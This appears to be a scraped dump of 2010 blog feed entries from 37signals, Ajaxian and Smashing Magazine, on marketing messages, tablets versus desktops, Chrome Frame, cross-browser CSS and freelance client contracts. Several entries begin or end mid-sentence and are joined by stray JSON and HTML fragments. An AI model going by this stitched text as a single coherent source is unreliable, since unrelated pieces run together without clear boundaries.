He’s been echoing the same message for over a decade. For people who have followed him that entire time, it may seem like old hat. But every day, there’s a new person out there who’s just discovering the notion of the customer experience and why it’s important and what they can do about it.</p>\n\n\n\t<p>Thomas Friedman keeps has written column after column (and a book) about the need for a <a href=\"http://query.nytimes.com/search/sitesearch?query=Thomas+friedman+green+-zone&amp;more=date_all\">“Green Revolution.”</a> Are some readers tired of it? Sure. But others are just coming to the message now.</p>\n\n\n\t<p>Warren Buffett doesn’t worry about delivering shiny, new, exciting ideas in <a href=\"http://www.berkshirehathaway.com/letters/letters.html\">his annual letters to shareholders</a>. He just keeps hammering away at the same themes that have guided him throughout his investment life.</p>\n\n\n\t<p><strong>Reaching the new class</strong> <br>\nIn <a href=\"http://www.37signals.com/rework\"><span>REWORK</span></a>, we talk about how you need to be willing to <a href=\"http://www.flickr.com/photos/37s/4418288965/\">let your customers outgrow you</a>. There are more people who are not using your product than people who are; You need to make sure you make it easy for these people to get on board. That’s where your continued growth potential lies.</p>\n\n\n\t<p>It’s the same for your marketing message. There may be .0001% who have read everything you’ve ever written and who want you to deliver something brand new. Follow their wishes and you’ll wind up with a tiny audience of experts while excluding the 99.9999% of people who have no idea who you are or what you think.</p>\n\n\n\t<p>There’s a new batch of freshmen every year. Every day, there’s a new person discovering you for the first time. If your message is simple and accessible, they can become fans. If it’s geared exclusively to PhD candidates, these freshmen will never latch onto you.</p>\n\n\n\t<p><strong>A drop in the bucket</strong> <br>\nIt’s also wise to keep in mind that it takes multiple mentions for an idea to really sink in. For most of those who follow you, your ideas are just a drop in the information overload bucket. That’s why you need to keep plugging away.</p>\n\n\n\t<p>Marketing something is akin to being Andy Dufresne in The Shawshank Redemption chipping away at his cell wall. Like Andy, you’re not gonna dig a tunnel overnight. It’s going to take years. You need to hammer away at the same point in the wall to get anywhere. If you keep changing spots every week, you’re never going to break out.</p>\n\n\n\t<p><strong>Honing your message</strong> <br>\nPlus, you keep getting better at making your point(s). You can’t just expect to say it perfectly out of the gate and then never have to repeat it again. The first time you say something, you get to guage its impact. If you hit on something, you can start refining it. It’ll keep getting better. A blog post can lead to a conference presentation which can lead to an interview which can lead to a magazine article which can lead to a book. And each step of the way, the message will get tighter and clearer.</p>\n\n\n\t<p><strong>Your foundation is your foundation</strong> <br>\nDoubling down on a message is how you take a stand. Of course, you don’t want to sound like a broken record. You should find new angles and new ways to present those ideas. But remember it’s ok to keep plugging away at the same themes when you really believe them because, well, they’re what you really believe. The way you get to be the Buffett of <em>your</em> message is by sticking to it.</p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=oCYqnAt8DGU:95IlHzb_5b0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=oCYqnAt8DGU:95IlHzb_5b0:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div>"

      "content" : "<p>There’s been buzz in UI circles about the <a href=\"http://andycroll.com/writing/the-end-of-hover\">end of hovers</a> since the iPad’s debut. I’ve mentioned in talks that touch tablets pose a design challenge for web apps that rely on hovering with a mouse. But the fact that hovers don’t work on touch devices doesn’t spell their doom. If we step back from hovers to the wider picture, comparing the desktop’s vocabulary with the limits of “tap, hold, and drag” can give us a handle on the gradually differentiating roles and equally bright futures of desktops and touch tablets.</p>\n\n\n\t<p>As touch tablets wax in popularity, they illuminate the role and utility of desktops (including laptops, which belong on a desk anyway). Take the desktop’s arsenal of gestures. Besides click and right-click, you have shift-click, command-click, command-tab, command-space, ctrl-a, ctrl-e, command-~,  command-w, and on and on and on to even include, yes, the hover.</p>\n\n\n\t<p>I always felt like computers were meant to be used with at least a hand poised on the home row, because without that arsenal of verbs things just take too long. As a power user, watching someone who isn’t familiar with all the shortcuts can put your patience under observation. To some folks, everything about the desktop is a hindrance, like swimming in molasses.</p>\n\n\n\t<p>But to the geeky or trained, the desktop is a fount of power and speed. Documents are side by side, text flies from here to there, IMs are answered and dismissed, mockups reloaded, batches processed, all with tiny movements of the fingers. For those of us who work all day on computers, touch interfaces are not an impending disruption.</p>\n\n\n\t<p>While the future of the desktop is bright, like some maturing stars it also becomes more concentrated. If I place a bet, it’ll be that the desktop  negotiates its place among tablets to settle on a role we haven’t seen in a while: the workstation. As for interface designers, we will sometimes shift out of the one-size-fits-all mindset to ask ourselves: Which device is this app really for? The workstation or the tablet?</p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=4wAMlZg9Ezg:UEEjpyzDKNU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=4wAMlZg9Ezg:UEEjpyzDKNU:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div>"

He told us a little about it:</p>\n<blockquote><p>\nThe main concept works on using CSS3 for the radius, making a round circle view point. This contains an iframe which is the exact same content. Using CSS3 again I scale the content in the iframe so that it is x2 larger, allowing smaller content to be read. The magnifying glass is also controlled by simple keyboard combinations which allow for show / hide and zooming in and out. Future plans will include Chrome and Firefox add-ons meaning that an iframe will no longer be used and can then use canvas to get the page content, which can then be updated as the page content updates.\n</p></blockquote>\n<p>Check it out in action:</p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/JRRIoDe69ac%26rel%3D0%26color1%3D0xb1b1b1%26color2%3D0xd0d0d0%26hl%3Den_US%26feature%3Dplayer_embedded%26fs%3D1&amp;width=640&amp;height=385\" width=\"640\" height=\"385\"></iframe></p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=K0EQiGGDyFw:FO86OCbBboI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=K0EQiGGDyFw:FO86OCbBboI:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=K0EQiGGDyFw:FO86OCbBboI:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?i=K0EQiGGDyFw:FO86OCbBboI:D7DqB2pKExk\" border=\"0\"></a>\n</div>"

That is the sound of Google Chrome Frame <a href=\"http://blog.chromium.org/2010/06/google-chrome-frame-now-in-beta.html\">getting a beta tag on it</a> with a new version that comes up to Chrome 5 levels:</p>\n<blockquote><p>\nInstead of adding new bells and whistles, we&#39;ve fixed more than 200 bugs to make integration with Internet Explorer seamless while improving security, stability, and performance. For example, we’ve improved our handling of Internet Explorer’s InPrivate browsing, cache clearing, and cookie blocking. All of the enhancements and features of <a href=\"http://chrome.blogspot.com/2010/05/new-chrome-stable-release-welcome-mac.html\">Google Chrome 5.0</a> are available in Google Chrome Frame too, including HTML5 audio and video, canvas, geolocation, workers, and databases.</p>\n<p>As we&#39;ve worked on these improvements, we’ve been excited to see sites adopting Google Chrome Frame, including <a href=\"http://www.meebo.com\">Meebo</a> and all the blogs hosted by <a href=\"http://www.wordpress.com\">WordPress</a>. In addition to our launch partner Google Wave, some other Google properties, including Orkut and YouTube are also relying on Google Chrome Frame to deliver HTML5 experiences to millions of users.</p>\n<p>For those of you who want to develop HTML5 applications and deploy them broadly, we encourage you to <a href=\"http://www.google.com/chromeframe/\">give Google Chrome Frame a try</a>. Existing users will be auto-updated to the beta, so if you downloaded Google Chrome Frame before, you’ll automatically get the new version. We’re also creating a new <a href=\"http://www.google.com/chromeframe/eula.html?extra=devchannel\">dev channel</a> release, where you can try out the cutting-edge features we’re developing.  For information on getting started with Google Chrome Frame, our project <a href=\"http://www.chromium.org/developers/how-tos/chrome-frame-getting-started\">documentation</a> is the place to start.\n</p></blockquote>\n<p>Alex gave a talk on how you can sprinkle in the Chrome Frame love, and start using the HTML5 goodness of video, svg, canvas, etc today!</p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/Sfe2l8QKxPg%26color1%3D0xb1b1b1%26color2%3D0xd0d0d0%26hl%3Den_US%26feature%3Dplayer_embedded%26fs%3D1&amp;width=640&amp;height=385\" width=\"640\" height=\"385\"></iframe></p>\n<p>We hear cries of <a href=\"http://clubajax.org/ie6-the-end-is-near/\">the end is near!</a>, and now you have a new push. Take a breath and spend the IE6 cycles on building amazing Web applications. So, <a href=\"http://www.chromium.org/developers/how-tos/chrome-frame-getting-started\">CFInstall.check({..})</a> away! :)</p>\n<p>Alex has a <a href=\"http://alex.dojotoolkit.org/2010/06/beta/\">post on the beta itself</a>:</p>\n<blockquote><p>\nIn some ways it’s a strange product; it’s working best when you notice it least. As a developer, you shouldn’t have to think much harder about it than either to include the header or meta tag or to include a couple of lines of script to prompt users to install the plugin — a process which notably doesn’t require a restart and doesn’t even take users off of your site. There’s no new tool to learn, no new language you have to wrap your head around…in fact, the hardest part might just be putting down all the habits we’ve collected for catering to legacy browsers.</p>\n<p>As I’ve begun to build exclusively to modern browsers, the experience of concerted un-learning of hacks and the ability to write directly to the platform again, sans toolkit, has been eye opening. Yes, there’s still a lot that can be improved in DOM, CSS, and HTML, but things are moving, and the tools we need now aren’t the tools we have today. Better yet, there’s every indication that things are progressing fast enough that instead of building tools to bring up the rear, we’ll be building them to shield ourselves from the ferocious pace of improvement should we need them at all.</p>\n<p>If you’re starting a new project today, I encourage you to prototype to HTML5 and modern features and then think hard about what you’re building and for whom. Do these apps really need to run on legacy browsers? Why not just use GCF to make that pain and expense go away. Once you’ve experienced how good modern web development can be — how rich and fast the apps you can deliver are — I’m convinced that you’ll find it hard to go back. The rich, open, interoperable web is the platform of the future, and I couldn’t be happier that GCF is going to help deliver that future.\n</p></blockquote>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=UGc9Sn4d1gA:qd71UcFnaD8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=UGc9Sn4d1gA:qd71UcFnaD8:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/ajaxian?a=UGc9Sn4d1gA:qd71UcFnaD8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/ajaxian?i=UGc9Sn4d1gA:qd71UcFnaD8:D7DqB2pKExk\" border=\"0\"></a>\n</div>"

Unfortunately, that goal is generally agreed to be almost impossible to attain. Some have even <a href=\"http://dowebsitesneedtolookexactlythesameineverybrowser.com/\">gone on record</a> as stating that perfect, cross-browser compatibility is not necessary.</p><p>While I agree that creating a consistent experience for every user in every browser (putting aside mobile platforms for the moment) is never going to happen for every project, I believe <strong>a near-exact cross-browser experience is attainable</strong> in many cases.

Try it out if you have an iPhone, Blackberry or another capable device.]</p><h3>Understand the CSS Box Model</h3><p>This is one of the first things you should be thoroughly familiar with if you want to be able to achieve <strong>cross-browser layouts with very few hacks and workarounds</strong>. Fortunately, the box model is not a difficult thing to grasp, and generally works the same in all browsers, except in circumstances related to certain versions of Internet Explorer (more on this later).</p><p>The CSS box model is responsible for calculating:</p><ul><li>How much space a block-level element takes up</li><li>Whether or not borders and/or margins overlap, or collapse</li><li>A box’s dimensions</li><li>To some extent, a box’s position relative to other content on the page</li></ul><p>The CSS box model has the following basic rules:</p><ul><li>Block-level elements are essentially rectangular (as are all elements, really)</li><li>The dimensions of a block element are calculated by width, height, padding, borders, and margins</li><li>If no height is specified, a block element will be as high as the content it contains, plus padding (unless there are floats, for which see below)</li><li>If no width is specified, a non-floated box will expand to fit the width of its parent minus padding (more on this later)</li></ul><p>Some important things to keep in mind for dealing with block-level elements:</p><ul><li>If a box has its width set to “100%”, it shouldn’t have any margins, padding, or borders, otherwise it will overflow its parent</li><li>Vertically-adjacent margins can cause some <a href=\"http://reference.sitepoint.com/css/collapsingmargins\">complex collapsing issues</a> that may cause layout problems</li><li>Elements positioned relatively or absolutely will behave differently, the details of which are extensive and beyond the scope of this article</li><li>The rules and principles above are stated under the assumption that the page holding the block-level elements is rendered in standards mode (this point was added later after review of the <a href=\"http://www.smashingmagazine.com/2010/06/07/the-principles-of-cross-browser-css-coding/#comments\">comments posted</a>)</li></ul><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/css-box-model.gif\" alt=\"Css-box-model in The Principles Of Cross-Browser CSS Coding\" width=\"500\" height=\"270\"><br><strong><em>The box model as its displayed using Firebug in Firefox</em></strong></p><h3>Understand the Difference Between Block and Inline</h3><p>For experienced developers, this is another no-brainer. It is, however, another crucial area that, when fully understood, will cause <a href=\"http://css-tricks.com/the-css-ah-ha-moment/\">the light bulb to appear</a>, <strong>many headaches will be avoided</strong>, and you’ll feel much more confident in creating cross-browser layouts.</p><p>The image below illustrates the difference between block and inline elements:</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/block-inline.jpg\" alt=\"Block-inline in The Principles Of Cross-Browser CSS Coding\" width=\"500\" height=\"500\"></p><p>Here are some basic rules that differentiate block elements from inline:</p><ul><li>Block elements will, by default, naturally expand horizontally to fill their parent container, so there’s no need to set a width of “100%”</li><li>Block elements will, by default, begin at the leftmost edge of the parent box, below any previous block elements (unless floats or positioned elements are utilized; see below)</li><li>Inline elements will ignore width or height settings</li><li>Inline elements flow with text, and are subject to typographical properties such as <code>white-space</code>, <code>font-size</code>, and <code>letter-spacing</code></li><li>Inline elements can be aligned using the <code>vertical-align</code> property, but block elements cannot</li><li>Inline elements will have some natural space below them in order to accommodate text elements that drop below the line (like the letter “g”)</li><li>An inline element will become a block element if it is floated</li></ul><h3>Understand Floating and Clearing</h3><p>For multi-column layouts that are relatively easy to maintain, the best method is to use <a href=\"http://www.smashingmagazine.com/2009/10/19/the-mystery-of-css-float-property/\">floats</a>. Having a <strong>solid understanding of how floats work</strong> is, therefore, another important factor in achieving a cross-browser experience.</p><p>A floated element can be floated either left or right, with the result that the floated element will shift in the specified direction until it reaches the edge of its parent container, or the edge of another floated element. All non-floated, inline content that appears below the floated element will flow along the side of the element that is opposite to the float direction.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/float-css.jpg\" alt=\"Float-css in The Principles Of Cross-Browser CSS Coding\" width=\"500\" height=\"439\"></p><p>Here are some important things to keep in mind when floating and clearing elements:</p><ul><li>Floated elements are removed from the flow of other block-level, non-floated elements; so in other words, if you float a box left, a trailing paragraph (block level) that’s not floated will appear behind the float in the stack, and any text inside the paragraph (inline level) will flow around the float</li><li>To get content to flow around a floated element, it must be either inline or else floated in the same direction</li><li>A floated element without a declared width will shrink to the width of its content, so its generally best to have a set width on a float</li><li>If a block element contains floated children, it will “collapse”, <a href=\"http://www.sitepoint.com/blogs/2005/02/26/simple-clearing-of-floats/\">requiring a fix</a></li><li>An element that’s “cleared” will avoid flowing around floated elements above them in the document</li><li>An element that’s both cleared and floated will only clear itself of elements that come before, not after</li></ul><h3>Use Internet Explorer First (Or Don’t)</h3><p><strong>Please note that Smashing Magazine’s team strongly advises against developing websites in Internet Explorer first. In our opinion, sites should be developed in “modern” web-browsers, with standards first and then be tweaked for buggy versions of Internet Explorer. The advice below does not reflect the opinion of the Smashing Editorial team. Agree or disagree? Comment on this article!</strong></p><p>Most of what I’ve discussed so far has to do with CSS coding and layout principles. This principle is more related to habits and preferences of most designers. Although we might hate to use IE6 and IE7 in our everyday internet activities, when it comes time to build a client project from scratch, one of the best things you can do is <strong>test your layout in those browsers early</strong> in development. You might even want to open up a <a href=\"http://www.my-debugbar.com/wiki/IETester/HomePage\">standalone version of IE6 or IE7</a> and just start your development in that browser.</p><p>Of course, you won’t have access to tools like Firebug, but generally for CSS (especially early in development) you won’t need Firebug. It’s much easier to get a layout working first in IE6 and IE7, then fix for other browsers, than to do it the other way around. Waiting until late in the development process to open up IE6 and/or IE7 will likely cause some, if not all, of the following problems:</p><ul><li>Multiple hacks will be required, needing separate stylesheets for different versions of IE, making the code bloated and less maintainable and making the website slower</li><li>The layout in some spots may have to be reworked, multiplying development time</li><li>Testing time will increase, sometimes exponentially, leaving less time for more important tasks</li><li>The layout in other browsers will not be the same as in IE6 and IE7</li></ul><p>I wouldn’t expect developers to use Internet Explorer this aggressively for personal projects, web apps, or other non-client work. But <strong>for corporate clients</strong> whose user base is primarily on Internet Explorer, this tip could prevent a lot of headaches while getting things to work properly, and will definitely make a <strong>cross-browser experience much more likely</strong>.</p><p>Sometimes viewing IE’s problems as “annoying bugs” can create unnecessary negativity, and can hinder development time and future maintenance. Dealing with IE is a fact of life for designers and developers, so just view its problems as you would any CSS issue — and build from there.</p><h3>Understand Internet Explorer’s Most Common Problems</h3><p>If you’re going to start with IE in your development, or at the very least check your layout in IE early on, then you should understand what things Internet Explorer (usually versions 6 &amp; 7) has problems with, or what its limitations are.</p><p>A detailed discussion of every possible problem that can occur in Internet Explorer, and a list of <a href=\"http://www.smashingmagazine.com/2009/10/14/css-differences-in-internet-explorer-6-7-and-8/\">all of its CSS compatibility issues</a> is certainly beyond this article. But there are some fairly significant inconsistencies and issues that come up in relation to IE that all CSS developers should be aware of. Here is a rundown of the most common problems you’ll need to deal with:</p><ul><li>IE6 will become problematic if floats are overused, causing (paradoxically) <a href=\"http://haslayout.net/css/Disappearing-Content-Bug\">disappearing content</a> or <a href=\"http://www.impressivewebs.com/ie6-ghost-text-bug-with-multiple-solutions/\">duplicate text</a></li><li>IE6 will double the margin on floated elements on the side that is the same direction as the float; setting <code>display: inline</code> will often fix this</li><li>In IE6 and IE7, if an element <a href=\"http://reference.sitepoint.com/css/haslayout\">doesn’t have layout</a>, it can cause a number of problems, including backgrounds not showing up, margins collapsing improperly, <a href=\"http://www.satzansatz.de/cssd/onhavinglayout.html\">and more</a></li><li>IE6 does not support min- and max-based CSS properties like <code>min-height</code>, or <code>max-width</code></li><li>IE6 does not support fixed positioning of background images</li><li>IE6 and IE7 do not support many alternate values for the <code>display</code> property (e.g. <code>inline-table</code>, <code>table-cell</code>, <code>table-row</code>, etc.)</li><li>You cannot use the <code>:hover</code> pseudo-class on any element in IE6 except an anchor (<code>&lt;a&gt;</code>)</li><li>Certain versions of IE have <a href=\"http://www.impressivewebs.com/buggy-css-selectors-cross-browser-jquery/\">little support for certain CSS selectors</a> (e.g. attribute selectors, child selectors, etc.)</li><li>IE versions 6-8 have little support for CSS3, but there are <a href=\"http://www.smashingmagazine.com/2010/04/28/css3-solutions-for-internet-explorer/\">some workarounds</a></li></ul><p>There are many more bugs, issues, and inconsistencies that can arise in Internet Explorer, but these are probably the most common and most important ones to keep in mind when trying to create a cross-browser experience. I encourage all developers to <strong>do further research on many of the issues</strong> I’ve mentioned above in order to have a more accurate understanding of what problems these issues can cause, and how to handle them.</p><h3>Some Things Will Never Look the Same</h3><p>As already mentioned, creating the exact same experience visually and functionally in every browser is possible, but unlikely. You can get the layout and positioning of elements close to pixel-perfect, but there are <strong>some things that are out of the developer’s control</strong>.</p><h4>Forms Will Often Look Different</h4><p>Discussing all the differences and quirks that occur with form elements across the different browsers and platforms could be an article in itself, so I won’t go into extensive details here. A simple visual demonstration, however, should suffice to get the point across.</p><p>Take a look at the image below, which displays the <code>&lt;select&gt;</code> elements on the <a href=\"http://www.facebook.com\">Facebook</a> home page, as shown in 5 different browser versions (screenshots taken from <a href=\"https://browserlab.adobe.com\">Adobe’s Browserlab</a>):</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/forms-browsers.jpg\" alt=\"Forms-browsers in The Principles Of Cross-Browser CSS Coding\" width=\"500\" height=\"331\"><br><strong><em><code>&lt;select&gt;</code> elements appear differently in different browsers</em></strong></p><p>Some form elements can be controlled visually. For example, if the client requires that the submit button looks the same in every browser, that’s no problem, you can just use an image, instead of the default <code>&lt;input type=&quot;submit&quot;&gt;</code>, which, similar to <code>&lt;select&gt;</code> elements, will look different in different browsers.</p><p>But other form elements, like radio buttons, textarea fields, and the aforementioned <code>&lt;select&gt;</code> elements, are impossible to style in a cross-browser fashion without complicating matters using <a href=\"http://widowmaker.kiev.ua/checkbox/\">JavaScript plugins</a> (which some developers feel harm the user experience).</p><h4>Typography Will Always Look Different</h4><p>Another area in which we can’t expect pixel-perfect designs is with regards to fonts, particularly fonts on body copy. <a href=\"http://www.smashingmagazine.com/2009/10/22/rich-typography-on-the-web-techniques-and-tools/\">Different methods</a> have sprung up to help with custom fonts in headers, and the recently launched <a href=\"http://code.google.com/apis/webfonts/\">Google Font API</a> will contribute to this. But body copy will probably always look different in different browsers.</p><p>With typography, we not only face the problem of font availability on different machines, but in some cases even when the font is available on two different machines, the type will look different. <a href=\"http://www.microsoft.com/typography/cleartype/tuner/step1.aspx\">Windows ClearType</a>, for example, is available on IE7, but not on IE6, causing the same font to look different on two different versions of IE.</p><p>The graphic below displays screenshots from <a href=\"http://www.alistapart.com/\">A List Apart</a> on IE6 and IE7. The grainy text in IE6 is more evident on the heading than in the body copy, but all text displays a marked difference between the two browsers (unless of course the text is an image):</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/cleartype-ie.jpg\" alt=\"Cleartype-ie in The Principles Of Cross-Browser CSS Coding\" width=\"500\" height=\"381\"><br><strong><em>A List Apart’s typography compared in IE6 and IE7</em></strong></p><h3>Use a CSS Reset</h3><p>Ever since I started using a CSS reset for my projects, my <strong>ability to create a cross-browser experience has greatly increased</strong>. It’s true that most resets will add unnecessary code to your CSS, but you can always go through and remove any selectors that you know will not be a factor (for example, if you don’t plan to use the <code>&lt;blockquote&gt;</code> tag, then you can remove reference to it, and repeat this for any other unused tags).</p><p>Many of the margin- and padding-related differences that occur across different browsers become more normalized (even in troublesome HTML forms) when a CSS reset is implemented. Because the reset causes all elements to start from a zero base, you gain more control over the spacing and alignment of elements because all browsers will begin from the same basic settings.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/reset-wd.jpg\" alt=\"Reset-wd in The Principles Of Cross-Browser CSS Coding\" width=\"500\" height=\"319\"><br><strong><em>A CSS reset as shown in Firefox’s developer toolbar</em></strong></p><p>Besides the benefits of producing a cross-browser experience, a reset will also be beneficial because you won’t use as many hacks, your code will be less bloated, and you’ll be much more likely to create maintainable code. I recommend <a href=\"http://meyerweb.com/eric/tools/css/reset/\">Eric Meyer’s CSS reset</a>, which I’ve been using for quite some time now.</p><h3>Use SitePoint’s CSS Reference</h3><p>If you’re having trouble getting a particular CSS property to display correctly across all browsers, look up the property in the <a href=\"http://reference.sitepoint.com/css\">SitePoint CSS Reference</a> to see if it has any compatibility limitations. SitePoint’s reference (which is also available <a href=\"http://www.sitepoint.com/books/cssref1/\">as a hard copy</a> (though not as up to date), includes a useful compatibility chart that displays browser support for every standard CSS property.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/06/sitepoint-chart.jpg\" alt=\"Sitepoint-chart in The Principles Of Cross-Browser CSS Coding\" width=\"500\" height=\"127\"><br><strong><em>SitePoint’s Compatibility Charts for CSS Properties</em></strong></p><p>Each compatibility chart is accompanied by a fairly detailed description of the bugs that occur in different browsers, and users are permitted to add comments to document new bugs that come up and to provide further explanations on complex CSS issues.</p><p>Using this as a guide, you can narrow down the possibilities, and can usually determine whether or not a CSS issue is due to a browser bug, or due to your own misapplication or misunderstanding of the CSS property in question.</p><h3>Conclusion</h3><p>While there is so much more that could be discussed on the topic of cross-browser CSS, the principles and guidelines I’ve introduced here should provide a foundation to assist CSS developers in creating as close to a consistent cross-browser experience as is currently possible. Cross-browser CSS is an attainable goal, within reasonable limits.</p><p>But, as an epilogue to this article, I also would like to concur with <a href=\"http://perishablepress.com/press/2010/01/11/css3-progressive-enhancement-smart-design/\">those promoting the use of CSS3 with progressive enhancement</a>, and encourage developers to push new CSS techniques to the limits, even doing so, where possible, on client projects.</p><p>The principles I’ve introduced here should help developers create a beautiful and intuitive experience in IE, while providing an <em>extra</em>-beautiful and <em>super</em>-intuitive experience in the more up-to-date browsers. That’s a cross-browser goal that is definitely worth striving for.</p><hr><p><small>© Louis Lazaris for <a href=\"http://www.smashingmagazine.com\">Smashing Magazine</a>, 2010. | <a href=\"http://www.smashingmagazine.com/2010/06/07/the-principles-of-cross-browser-css-coding/\">Permalink</a> | <a href=\"http://www.smashingmagazine.com/2010/06/07/the-principles-of-cross-browser-css-coding/#comments\">Post a comment</a> | <a title=\"Bookmark in del.icio.us\" href=\"http://del.icio.us/post?url=http://www.smashingmagazine.com/2010/06/07/the-principles-of-cross-browser-css-coding/&amp;title=The%20Principles%20Of%20Cross-Browser%20CSS%20Coding\">Add to del.icio.us</a> | <a title=\"Bookmark in Digg\" href=\"http://digg.com/submit?phase=2&amp;url=http://www.smashingmagazine.com/2010/06/07/the-principles-of-cross-browser-css-coding/\">Digg this</a> | <a title=\"Stumble on StumbleUpon\" href=\"http://www.stumbleupon.com/submit?url=http://www.smashingmagazine.com/2010/06/07/the-principles-of-cross-browser-css-coding/\">Stumble on StumbleUpon!</a> | <a title=\"Tweet us!\" href=\"http://twitter.com/home?status=@tweetmeme%20@smashingmag%20Reading%20&#39;The%20Principles%20Of%20Cross-Browser%20CSS%20Coding&#39;%20http://www.smashingmagazine.com/2010/06/07/the-principles-of-cross-browser-css-coding/\">Tweet it!</a> | <a title=\"Bookmark in Reddit\" href=\"http://reddit.com/submit?url=http://www.smashingmagazine.com/2010/06/07/the-principles-of-cross-browser-css-coding/\">Submit to Reddit</a> | <a href=\"http://forum.smashingmagazine.com/\">Forum Smashing Magazine</a><br> Post tags: <a href=\"http://www.smashingmagazine.com/tag/css/\" rel=\"tag\">CSS</a><br> </small></p>"

Client interaction can either lead to strong relationships that last a lifetime or make you feel low and worthless.</p><p>We look at our designs as our own children, and why not? We create our work from our mind and very being. We have an emotional attachment to our work. But we also need to earn a living from that creativity, and there lies the door to our problems and aggravation.</p><p>The question arose on a blog about how to screen a client. Perhaps talking about it in terms of how to spot a sketchy client would be a bit much, but like any freelancer, I need to dump my anxieties on those who sign my paychecks. From corporate clients to the single-owner businesses, clients are our lifeblood… and they can be a cruel, cruel mistress. No wonder we drink.</p><h4>How to Spot a Sketchy Client</h4><p>The number one recommendation of many is to <strong>have a strong contract</strong>. True, this legal instrument can be easily ignored by clients, who know full well that you may never collect. The contract spells out the terms and rights — terms that will soon be tossed aside by the client (I swear, almost gleefully at times).</p><p>The contract is usually the deal-breaker for me. If they refuse a contract, you know you’ll have nothing but trouble ahead, particularly with regards to getting paid. Walking away, then, costs nothing and empowers you. Taking something from the client’s office as you exit makes you feel even better: a pen, a desk clock, the coat hanging on the door (as though you brought it). Call it “Travel and compensation for expenses.”</p><p>Let’s say you now have a draft contract. After many conversations, calls, emails, meetings and such, you send the contract to the client to sign, but they refuse to sign. You’ll hear so many reasons, and they are all entertaining. Here is a classic exchange of mine:</p><blockquote><p>Me: Here’s my contract. Sign it and we’ll begin.</p><p>Them: We don’t need a contract. You can trust me.</p><p>Me: Oh, I do trust you. But if you get hit by a bus tomorrow, then I’ll need legal documentation to collect from the company.</p><p>Them: I won’t get hit by a bus.</p><p>Me: It could be a slip in the shower. That’s the number one kille…</p><p>Them: I don’t sign contracts!</p><p>Me: How did you get phone service or office space or equipment?</p><p>Them: I could hire an art student to do this with no contract and for less money!</p><p>Me: Then why did you contact me?</p></blockquote><p>At this point, I’m usually told to get out.</p><p>One client agreed to a contract but wanted to tack on the phrase “… and anything else needed” to the end of a laundry list of services included in the quoted fee. I pictured myself sitting in a retirement home with the client still demanding design work and being unable to bill them until they had “anything else needed.” That, of course, went nowhere. All in all, a substantial waste of time.</p><h4>What to include in a contract</h4><p>Designers ask me about my contract. It’s a hybrid of the <a href=\"http://www.aiga.org/content.cfm/standard-agreement\">AIGA</a>, GAG and common sense changes for the sake of digital-signature contracts. Tad Crawford, the well-known attorney for artists’ rights, has a <a href=\"http://www.amazon.com/Business-Legal-Forms-Graphic-Designers/dp/1581152744/\">book</a> with form and contract templates, which I highly recommend.</p><p>When a client and I have agreed to a creative brief, I tell the client that I’ll send confirmation. Semantics seem to alleviate the fear of the word “contract.” Quite simply, the contract, as stated, is deemed to have been accepted once the job commences (I email to confirm that they have received the “confirmation,” and I keep all emails pertaining to the contract and to the client confirming their acceptance), and it is legally considered a digital signature when the client responds in the affirmative to begin the project.</p><p><strong>Client:</strong> ________________</p><p><strong>Primary Contact:</strong> ________________</p><p><strong>Project:</strong> _______________</p><p><strong>Date of Project:</strong> _________</p><p><strong>Project Deadline:</strong> ________</p><p><strong>Purchase Order #:</strong> _______</p><p><strong>Your Name:</strong> _____________</p><p><strong>Invoice #:</strong> _____</p><p><strong>Creative brief:</strong> [Include the approved creative brief that you wrote. This is an important part of the contract!]</p><p><strong>Fee:</strong> [This is where you lay out <em>all</em> terms of the sale, even if it is repeated in the contract terms below: how much, how many hours, what rights are sold or transferred, how many revisions, the hourly rate for those revisions, etc. It doesn’t have to be in legalese, just as complete as possible so that you don't have to sue to get paid for something you didn’t have in writing.]</p><p><strong>1. Payment</strong><br> All invoices are payable within 21 business days of receipt. A $50 service charge is payable on all overdue balances for reissuing each invoice at 45, 60, 75 and 90 days from the date of original invoice. The grant of any license or right of copyright is conditioned on receipt of full 